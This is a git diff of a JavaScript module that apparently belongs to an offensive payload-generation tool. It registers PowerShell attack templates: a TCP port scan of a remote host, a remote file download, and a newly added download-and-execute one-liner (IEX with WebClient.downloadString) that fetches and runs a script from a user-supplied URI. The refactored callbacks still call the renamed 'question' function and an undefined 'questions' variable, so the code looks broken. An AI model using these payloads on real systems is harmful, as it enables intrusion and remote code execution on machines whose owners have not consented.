@@ -1,6 +1,6 @@
 var prompt = require('prompt');
 var M = require('mstring');
-var question = require('../modules/questionUser');
+var ask = require('../modules/questionUser');
 
 // Initialize array and Payload Helper
 
@@ -128,8 +128,9 @@ Load({
 	title: "TCP Port Scan",
 	payload: '$ports=(<PROMPT (ports)>);$ip="<RHOST>";foreach ($p in $ports){try{$socket=New-object System.Net.Sockets.TCPClient($ip,$p);}catch{};if ($socket -eq $NULL){echo $ip":"$p" - Closed";}else{echo $ip":"$p" - Open";$socket = $NULL;}}',
 	category: "Powershell",
-	callback: function(returnToPrepare, lhost, lport, rhost, rport, user){
-		question.ask("Ports to scan? (ex: 80,443,8080)", returnToPrepare)
+	callback: function(bro){
+		question("Ports to scan? (ex: 80,443,8080)");
+		ask.some(questions, bro);
 	}
 })
 
@@ -137,8 +138,20 @@ Load({
 	title: "Download File",
 	payload: '(new-object system.net.webclient).downloadFile("<RHOST>","<PROMPT (local path)>")',
 	category: "Powershell",
-	callback: function(returnToPrepare, lhost, lport, rhost, rport, user){
-	    question.ask("Local path to save file?", returnToPrepare)
+	callback: function(bro){
+	    question("Local path to save file?")
+	    ask.some(questions, bro);
+
+	}
+})
+
+Load({
+	title: "Download and Execute Remote PSH Script",
+	payload: 'IEX (new-object net.webclient).downloadString("<PROMPT (Full URI)>");',
+	category: "Powershell",
+	callback: function(bro){
+	    question("What is the full URI path of the hosted PSH script? ")
+	    ask.some(questions, bro);
 	}
 })
 
